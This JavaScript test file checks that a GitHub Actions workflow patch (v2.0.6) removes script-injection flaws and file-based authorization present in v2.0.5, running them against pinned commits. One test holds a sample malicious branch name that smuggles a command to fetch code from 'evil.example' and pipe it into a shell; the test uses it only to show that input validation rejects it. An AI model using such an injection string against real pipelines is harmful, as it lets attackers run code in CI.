// P39b / P43 / M0.0b: the Template v2.0.6 patch, proven against the REAL tags in the
// public repo (pinned by SHA), with ai-native's own detector. v2.0.5 is vulnerable
// (B31 lines flagged, file-based authorization present); v2.0.6 is not.
// Needs github.com: locally it SKIPs, in CI (AI_NATIVE_REQUIRE_NETWORK=1) a failed clone fails.
import test, { after } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { checkWorkflow, findScriptInjection } from "../gates/supply-chain.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const V205 = "92a797c29750d5c9f64cccf8896f58e6827445cf";
const V206 = "6a6c2dd15ae4bf1338bf950bd6533dfb3ab36750";
const base = mkdtempSync(join(tmpdir(), "ai-native-p39b-"));
const clone = join(base, "t");
let cloned = true;
try {
  execFileSync("git", ["clone", "-q", "--no-checkout", "--filter=blob:none", "https://github.com/jlbellonGmail/template.git", clone], { stdio: "pipe" });
} catch (error) {
  if (process.env.AI_NATIVE_REQUIRE_NETWORK === "1") throw error;
  cloned = false;
}
after(() => rmSync(base, { recursive: true, force: true, maxRetries: 3 }));
const opts = { skip: cloned ? false : "github.com not reachable (set AI_NATIVE_REQUIRE_NETWORK=1 to make this a failure)", timeout: 200000 };
const show = (sha, path) => execFileSync("git", ["show", `${sha}:${path}`], { cwd: clone, encoding: "utf8", maxBuffer: 64 * 1024 * 1024 });
const STRIP = (t) => t.split("\n").filter((l) => !l.trimStart().startsWith("#")).join("\n");

test("tags are the pinned commits and v2.0.6 descends from v2.0.5's line", opts, () => {
  assert.equal(execFileSync("git", ["rev-parse", "v2.0.6^{commit}"], { cwd: clone, encoding: "utf8" }).trim(), V206);
  assert.equal(execFileSync("git", ["rev-parse", "v2.0.5^{commit}"], { cwd: clone, encoding: "utf8" }).trim(), V205);
  execFileSync("git", ["merge-base", "--is-ancestor", V205, V206], { cwd: clone });
});

for (const wf of ["post-hitl-merge-gate", "post-merge-close-feature"]) {
  test(`${wf}: v2.0.5 is flagged for script injection, v2.0.6 is clean`, opts, () => {
    const path = `.github/workflows/${wf}.yml`;
    assert.ok(findScriptInjection(show(V205, path)).length > 0, "the baseline must be vulnerable (otherwise the test proves nothing)");
    assert.deepEqual(findScriptInjection(show(V206, path)), []);
    assert.equal(checkWorkflow(path, show(V206, path)).some((f) => f.code === "SCRIPT_INJECTION" || f.code === "PRT_CHECKOUT_HEAD"), false);
  });
}

test("v2.0.5 trusts file-based authorization; v2.0.6 has no trace of it in code and rejects it", opts, () => {
  const old = STRIP(show(V205, ".github/workflows/post-hitl-merge-gate.yml"));
  assert.match(old, /PreAuthorizedHumanMerge/);
  assert.match(old, /ref: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
  const fixed = STRIP(show(V206, ".github/workflows/post-hitl-merge-gate.yml"));
  for (const needle of ["PreAuthorizedHumanMerge", "AuthorizationPath", "IndependentReviewPath", "IntegrityEvidencePath", "human-authorization"]) assert.equal(fixed.includes(needle), false, needle);
  assert.doesNotMatch(fixed, /pull_request\.head\.sha/);
  assert.match(fixed, /pull_request\.base\.sha/);
  assert.match(fixed, /persist-credentials: false/);
  assert.match(fixed, /pull_request_target:/);
  const script = show(V206, "scripts/complete-approved-pr.ps1");
  assert.match(script, /invalidada en v2\.0\.6/);
  assert.match(script, /--match-head-commit/);
  assert.doesNotMatch(script, /function Assert-PreAuthorizedHumanMerge/);
});

test("a malicious branch name never reaches script text in v2.0.6", opts, () => {
  const text = show(V206, ".github/workflows/post-hitl-merge-gate.yml");
  assert.match(text, /HEAD_REF: \$\{\{ github\.event\.pull_request\.head\.ref \}\}/);
  assert.match(text, /head_ref="\$HEAD_REF"/);
  const valid = /^feature\/[0-9]{2}-[a-z0-9]+(-[a-z0-9]+)*$/;
  assert.equal(valid.test("feature/01-x'; curl evil.example | sh; echo '"), false);
});

test("the v2.0.6 delta registered in parity/ matches the real Hash DB", () => {
  const db = JSON.parse(readFileSync(join(repoRoot, "parity/hash-db/hash-db.json"), "utf8")).tags;
  const delta = JSON.parse(readFileSync(join(repoRoot, "parity/v2.0.6-delta.json"), "utf8"));
  const a = db["v2.0.5"].files;
  const b = db["v2.0.6"].files;
  assert.equal(db["v2.0.6"].commit, V206);
  assert.equal(delta.to.commit, V206);
  assert.deepEqual(Object.keys(b).filter((k) => !(k in a)).sort(), [...delta.files.added].sort());
  assert.deepEqual(Object.keys(a).filter((k) => !(k in b)).sort(), [...delta.files.removed].sort());
  assert.deepEqual(Object.keys(b).filter((k) => k in a && a[k] !== b[k]).sort(), Object.keys(delta.files.changed).sort());
  assert.equal(delta.capabilitiesAdded, 0, "v2.0.6 must not add capabilities");
});
